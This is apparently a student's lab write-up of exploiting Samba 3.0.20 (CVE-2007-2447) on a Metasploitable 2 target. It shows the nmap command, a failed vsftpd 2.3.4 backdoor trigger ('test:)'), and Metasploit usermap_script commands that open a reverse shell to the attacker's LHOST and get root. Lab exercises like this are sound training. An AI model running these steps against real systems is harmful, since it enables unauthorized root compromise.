# SMB Samba Exploitation (Metasploitable 2)

## 📌 Overview

This project demonstrates the exploitation of a vulnerable Samba service (**version 3.0.20**) on Metasploitable 2 using the **username map script vulnerability (CVE-2007-2447)**.

The attack results in **remote command execution and root access** on the target system.

---

## 🧪 Lab Setup

* **Attacker Machine:** Kali Linux
* **Target Machine:** Metasploitable 2
* **Network:** Host-only (192.168.56.0/24)

---

## 🔎 Step 1: Network Scanning (Nmap)

```bash
nmap -A -p- 192.168.56.104
```

### Key Findings:

* **21/tcp** → FTP (vsftpd 2.3.4)
* **22/tcp** → SSH
* **139/tcp** → SMB
* **445/tcp** → SMB

---

## 🔐 Step 2: FTP Enumeration & Exploit Attempt

The FTP service was identified as **vsftpd 2.3.4**, which is known to contain a backdoor vulnerability.

### Attempt:

* Connected to FTP service
* Used username: `test:)` to trigger backdoor

### Result:

* Server requested a password instead of opening a shell
* No backdoor was triggered

### Conclusion:

The FTP exploit was **unsuccessful**, likely due to:

* patched service
* disabled backdoor
* or environment limitations

---

## 🎯 Step 3: Vulnerability Identification (SMB)

Using Metasploit:

```bash
search samba 3.0.20
```

### Identified Module:

```
exploit/multi/samba/usermap_script
```

* **Vulnerability:** Username Map Script Command Execution
* **CVE:** CVE-2007-2447

---

## 💣 Step 4: Exploitation

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.104
set LHOST 192.168.56.101
run
```

### Result:

* Reverse shell successfully opened

---

## 🔓 Step 5: Root Access Confirmation

```bash
whoami
root

id
uid=0(root) gid=0(root)
```

✔ Root access successfully achieved

---

## 📸 Screenshots

### Nmap Scan Results

![Nmap Scan](nmap-scan.png)

### FTP Exploit Attempt

![FTP Attempt](ftp-attempt.png)

### Exploitation

![Exploit Run](exploit-run.png)

### Root Access

![Root Access](root-access.png)

---

## 🔐 Security Insight

This vulnerability exists due to improper handling of user input in Samba configuration, allowing command injection.

---

## 🧠 Skills Demonstrated

* Network Scanning (Nmap)
* Service Enumeration
* Vulnerability Identification
* Exploitation using Metasploit
* Post-Exploitation Verification

---

## 📌 Conclusion

This lab demonstrates how outdated and misconfigured services can lead to full system compromise. Proper patching and service hardening are critical in real-world environments.
